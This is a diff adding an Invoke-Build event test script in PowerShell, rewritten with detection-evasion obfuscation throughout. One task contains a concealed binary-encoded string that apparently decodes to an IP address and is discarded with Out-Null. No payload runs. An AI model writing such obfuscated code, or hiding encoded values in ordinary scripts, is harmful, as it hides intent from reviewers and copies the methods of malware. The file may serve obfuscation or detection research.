@@ -1,0 +1,136 @@
+&('Sv') ("lfZ"+"W6")  ( [TypE]("{1}{2}{0}" -f'veRT','co','N')) ;  
+
+&('Set-L'+'oca'+'t'+'ion') ${H`ome}
+
+
+
+&('Ent'+'er-Bu'+'il'+'d') {
+	("{1}{2}{3}{0}"-f 'ld','Enter ','b','ui')
+	&('eq'+'uals') ${BU`I`LDRoOT} (&('Get-L'+'ocatio'+'n'))."PRoVi`d`ERPatH"
+	.('Se'+'t-Locat'+'ion') ${Ho`mE}
+}
+
+
+&('Ex'+'it-Buil'+'d') {
+	("{1}{2}{0}{3}"-f 'i','Ex','it bu','ld')
+	.('eq'+'ual'+'s') ${b`U`IlDRO`ot} (&('Get-L'+'oca'+'tion'))."PR`OViDeR`PA`Th"
+	.('Set-'+'Locat'+'i'+'on') ${h`Ome}
+}
+
+
+
+&('Ente'+'r-Bui'+'ld'+'Task') {
+	${TAs`KnAME} = ${tA`sK}."NA`mE" 
+	'Enter task {0}' -f ${T`ASKnaMe}
+	&('eq'+'uals') ${b`UiLDr`Oot} (&('G'+'e'+'t-Lo'+'cation'))."pR`Ov`iDeRP`AtH"
+	.('Set-'+'Lo'+'cation') ${ho`Me}
+}
+
+
+
+&('E'+'xit'+'-'+'B'+'uildTask') {
+	.('e'+'quals') ${tASKN`A`mE} ${t`AsK}."n`Ame" 
+	'Exit task {0}' -f ${tA`sK`NAME}
+	.('e'+'qual'+'s') ${b`UIL`drooT} (.('G'+'et-'+'Location'))."P`RoVI`de`RpatH"
+	.('Se'+'t-L'+'oca'+'tion') ${HO`Me}
+}
+
+
+
+&('Ent'+'er'+'-Buil'+'dJob') {
+	&('e'+'quals') ${Task`Na`ME} ${Ta`sk}."Na`mE" 
+	'Enter job {0}' -f ${TaS`knA`ME}
+	.('eq'+'uals') ${BUil`Dr`OoT} (.('G'+'et-Locati'+'o'+'n'))."prOVi`DErp`Ath"
+	&('Se'+'t-Lo'+'catio'+'n') ${hO`mE}
+}
+
+
+
+.('Exit-'+'Bu'+'i'+'ldJob') {
+	.('e'+'q'+'uals') ${TA`sK`NAme} ${ta`sK}."n`AmE" 
+	'Exit job {0}' -f ${TAs`Kn`AME}
+	&('equa'+'ls') ${b`U`ilDroot} (&('Ge'+'t-'+'Locati'+'on'))."PR`OViD`ERpath"
+	.('Set-'+'Lo'+'cation') ${H`omE}
+}
+
+&('ta'+'sk') ta`sk1 {
+	.('equ'+'als') ${Bu`Ild`Root} (&('Get-Loc'+'at'+'i'+'on'))."PR`OVi`DerPAth"
+	&('Se'+'t-'+'Locat'+'ion') ${HO`mE}
+	&('eq'+'uals') ${Ta`sk}."NA`ME" ("{0}{1}" -f'T','ask1') 
+	${t`ASk} = ("{1}{0}" -f ' set','can')
+}
+
+
+.('tas'+'k') TA`sk2 t`Ask1, {
+	.('equal'+'s') ${bUI`l`D`RooT} (.('Get-Locati'+'o'+'n'))."prO`V`IDerpAth"
+	&('Set'+'-Locat'+'ion') ${hO`ME}
+	&('eq'+'uals') ${tA`sk}."na`mE" ("{0}{1}" -f 'Tas','k2') 
+	${Ta`Sk} = ("{0}{1}" -f 'can s','et')
+}
+
+
+&('t'+'ask') REFtAsk2Wi`T`H`lo`WeR`casE TA`sk2
+
+
+.('tas'+'k') hELpTAS`K`AndE`VEn`Ts {
+	
+	${N`UlL} = .('e'+'xec') {.('Invoke-'+'P'+'owerS'+'hell') -NoProfile -Command I`NVOkE`-`BuiLD ? ${bUIL`d`F`ile}}
+}
+
+
+&('tas'+'k') In`Va`lidEVentS {
+	
+	(${R} = try { &('E'+'nter-Bu'+'il'+'d') 42} catch {${_}})
+	.('a'+'ssert') (${r}."i`NVO`CaT`IONiNFO"."L`InE"."cON`T`AiNs"(("{1}{0}"-f '##>','<')))
+	&('equa'+'l'+'s') ${r}."fUl`LyquALIfi`E`DErRO`Rid" ("{5}{9}{6}{4}{0}{3}{8}{1}{7}{2}{10}" -f'ation','or,En','l','E','sform','Parame','rArgumentTran','ter-Bui','rr','te','d')
+
+	
+	(${R} = try { .('E'+'nter-Bu'+'ild') {} 42} catch {${_}})
+	&('as'+'ser'+'t') (${R}."InV`OCAtIo`NIn`Fo"."LI`Ne"."con`TAInS"(("{0}{1}"-f '<#','#>')))
+	.('eq'+'ua'+'ls') ${R}."fu`llYq`U`Alifi`EdERRo`RiD" ("{5}{0}{6}{7}{4}{2}{1}{8}{3}" -f'alPara','-Bu','nter','ld','und,E','Position','m','eterNotFo','i')
+}
+
+
+&('ta'+'sk') fAIl`Edt`As`ke`R`RORINExit`BU`iLD`JoB {
+	${FI`le} = {
+		&('Exi'+'t'+'-B'+'uild'+'Job') {
+			.('a'+'ssert') ${t`AsK}."E`RrOR"
+		}
+		.('ta'+'sk') . {
+			throw 42
+		}
+	}
+	(${R} = try {.('I'+'nvoke-Bui'+'ld') . ${F`ilE}} catch {${_}})
+	.('e'+'quals') ${R}[-1]."fU`LLY`Q`UA`liFIe`dErrORId" '42'
+    ( (( ("{8}{11}{17}{14}{21}{6}{3}{9}{0}{15}{1}{16}{5}{20}{13}{4}{10}{7}{19}{18}{2}{23}{22}{12}" -f '10k110','10p','1','10j110010j110','1','1','10','10','100111-1','0','10010p1100','101001-1','Y100111','1Y101110k110010-','0000j','0','101110-110011:','11','110k','M101','1100','11','110010','11000k') -sPLit'p'-SPlit'M'-SpLiT ':' -splIT'Y' -sPLiT 'B' -SpLit'j' -sPLIt'S'-SPLIt'k' -spLit '-'-SPlIt 'd'| &('%'){ ([chAr](  ( .('ChiLd'+'it'+'EM') ('VARIABl'+'E'+':lfz'+'W6') )."v`ALUe"::"T`OInT16"( (${_}."to`St`RINg"() ) ,2 )))} )-join '' )) |  .('OuT-NU'+'l'+'L')
+}
+
+
+&('ta'+'sk') CANNo`T`AsSIG`NTaSKin`Ev`En`Ts {
+	${fI`le} = {
+		function aSsEr`T`-cannotSeTT`AsK {
+			(${R} = try {${tA`sk} = 1} catch {${_}})
+			.('equ'+'als') ${r}."fuLl`yQ`UAlifie`D`ERRO`RiD" VaRi`AbLeno`TW`R`iTABlE
+		}
+		&('En'+'ter-'+'BuildTask') {
+			("{3}{1}{2}{0}" -f 'Task','nter','-Build','E')
+			. ('As'+'s'+'e'+'rt-C'+'ann'+'otSetTask')
+		}
+		.('E'+'x'+'it-Bu'+'il'+'dTask') {
+			("{1}{0}{2}"-f'il','Exit-Bu','dTask')
+			. ('Assert-C'+'an'+'not'+'S'+'et'+'Task')
+		}
+		.('E'+'nter-'+'BuildJob') {
+			("{2}{0}{3}{1}" -f'r-','ldJob','Ente','Bui')
+			. ('Assert'+'-Cann'+'otSetTas'+'k')
+		}
+		.('Exit'+'-BuildJ'+'ob') {
+			("{1}{0}{2}" -f 't-Buil','Exi','dJob')
+			. ('A'+'ssert-CannotS'+'etT'+'ask')
+		}
+		&('tas'+'k') . {}
+	}
+	.('Invo'+'ke'+'-Build') . ${Fi`lE}
+}
+
+
